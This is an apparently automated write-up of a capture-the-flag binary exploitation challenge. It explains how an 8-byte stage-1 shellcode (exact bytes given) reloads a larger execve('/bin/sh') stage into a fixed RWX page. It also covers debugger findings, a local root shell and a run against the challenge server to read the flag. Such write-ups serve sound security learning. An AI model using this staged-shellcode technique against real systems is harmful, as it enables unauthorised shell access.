---
title: "[第六届信安大挑战]shellcode_revenge"
source_challenge: "[第六届信安大挑战]shellcode_revenge"
confirmation_source: platform_confirmed
verification_status: verified
run_id: "0cd56e959b7841faa43f9a9202044946"
---

# [第六届信安大挑战]shellcode_revenge

## 可复用方法

Flag found via 8-byte staged shellcode in fixed RWX mmap page: stage1 xor eax,eax; xchg rsi,rdx; syscall makes the program re-read a larger stage2 into 0x400000, execution falls through to 0x400007 where stage2[7:] is execve("/bin/sh"), then cat /flag on the remote service: [redacted] | Evidence: IDA/objdump main: mmap(0x400000,0x8000,PROT_READ|WRITE|EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); read(0,0x400000,0x1000) then `cmp n,8; jle continue` else puts("Shell too long!") -> first stage max 8 bytes; read(0,rbp-0x810,0x100) name; push 0; mov rdx,0x400000; jmp rdx ; gdb hbreak at 0x400000 showed entry registers: rax=name length, rdi=0, rsi=&name (directly after read, e.g. 0x7fffffffe220), rdx=0x400000, rsp=rbp-0x828 (stack NX, so jmp rsi is not directly usable) ; strace of a failed variant showed rax was the name-read return value and the raw syscall number mattered (migrate_pages with rax=0x100), confirming rax=0 must be forced before the read syscall ; Local exploitation of ./pwn with stage1=31c04887d60f0590 and stage2=7-byte filler+execve("/bin/sh") printed `PWNED` and `uid=0(root)`, proving control flow ; Remote run on noctf.fa1lsnow.com:40071: `id` unavailable, cwd `/`, `ls -la` showed `-rwxr--r-- 1 0 0 43 ... flag`; `cat flag` returned `[redacted]` (flag_output.txt)

## 验证步骤

1. 用 objdump/IDA 分析 main：程序 mmap(0x400000,0x8000,7,MAP_PRIVATE|MAP_ANONYMOUS) 得到固定地址 0x400000 的 RWX 页，随后 read(0,0x400000,0x1000) 读取 shellcode。
2. 反汇编关键分支：`cmp DWORD PTR [rbp-0x81c],0x8; jle 0x1352`，即只有读取长度 ≤8 时才继续，否则打印 "Shell too long!" 退出；因此第一段 shellcode 最多 8 字节。
3. 之后 read(0, rbp-0x810, 0x100) 读入可控的 name（栈上，NX），然后 `push 0; mov rdx,0x400000; jmp rdx` 跳入 RWX 页。
4. 用 gdb 在 0x400000 下硬件断点（hbreak 避免软件断点被 read 覆盖）测得入口寄存器：rax=name 字节数、rdi=0、rsi=name 栈地址、rdx=0x400000、rsp=rbp-0x828（栈不可执行），并发现之前的 xchg+syscall 方案因 rax=0x100 变成 migrate_pages 而失败。
5. 构造 8 字节 stage1：`31 c0 48 87 d6 0f 05 90` = xor eax,eax（rax=0 即 read 系统调用）；xchg rsi,rdx（rsi=0x400000 为 buf、rdx=旧 rsi 巨大计数）；syscall 重新从 stdin 读取第二段到 0x400000。由于读取会覆盖当前代码，syscall 返回后 rip 落在 0x400007，恰好是 stage2 的第 8 字节开始。
6. 发送 name（如 15 字节）使 name-read 返回后跳入 shellcode；再发送 stage2 = 7 字节填充 + execve("/bin/sh",0,0) 的机器码，覆盖 0x400000，从偏移 7 处执行得到 shell。本地实测输出 `PWNED`、`uid=0(root)`。
7. 对远端 nc noctf.fa1lsnow.com 40071 复用同一脚本；拿到 shell 后执行 `ls -la` 发现根目录 /flag（43 字节，others 可读），执行 `cat flag` 得到 [redacted]。
8. （尝试用 `2>/dev/null` 会因容器内 /dev/null 不可写而失败，改为直接 `cat flag` 成功。）通过 submit_flag 提交并确认，平台返回 CORRECT。
